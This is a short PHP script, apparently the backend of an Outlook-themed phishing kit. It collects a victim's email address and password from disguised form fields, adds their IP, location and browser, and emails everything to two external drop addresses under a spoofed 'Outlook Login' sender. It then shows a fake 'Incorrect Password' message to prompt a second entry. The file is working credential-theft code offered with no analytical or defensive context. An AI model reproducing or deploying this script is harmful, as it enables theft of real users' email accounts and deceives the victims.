<?php

$geo = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$_SERVER['REMOTE_ADDR']));
$country = $geo['geoplugin_regionName'].", ".$geo['geoplugin_countryName'];

function getIp(){
	$ip = $_SERVER['REMOTE_ADDR'];
	
	if(!empty($_SERVER['HTTP_CLIENT_IP'])){
		$ip = $_SERVER['HTTP_CLIENT_IP'];
	}elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	}
	return $ip;
}

if(isset($_GET['others'])){	
	$ip = getIp();
	$data = array();
    $data['subject'] = ' Outlook | $ip';
    $data['browser'] = $country." ".$_SERVER['HTTP_USER_AGENT'];

    $data['message'] = 
    '
    	<html>
			<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
				<title>Outlook Login</title>
			</head>

			<body>
			    <p><strong>Email ID:</strong> '.$_REQUEST['stained'].'</p>
			    <p><strong>Re-Password:</strong> '.$_REQUEST['erased'].'</p>
			    <p><strong>Browser:</strong> '.$data['browser'].'</p>
			    <p><strong>IP:</strong> '.$ip.'</p>
			    <br>
			</body>
		</html>
    ';

    $data['resultbox'] = "replyresult001@gmail.com,mailbox0nline@yandex.com";
	
	$header = "MIME-Version: 1.0"."\r\n";
	$header .= "Content-type:text/html;charset=UTF-8"."\r\n";
	$header .= "From: Outlook Login <support@officelogin.com>"."\r\n";

	//Forward the mail
	if(mail($data['resultbox'], $data['subject'], $data['message'], $header)){
		echo 'Incorrect Password';
	}else{
		echo 'Something went wrong';
	}

} 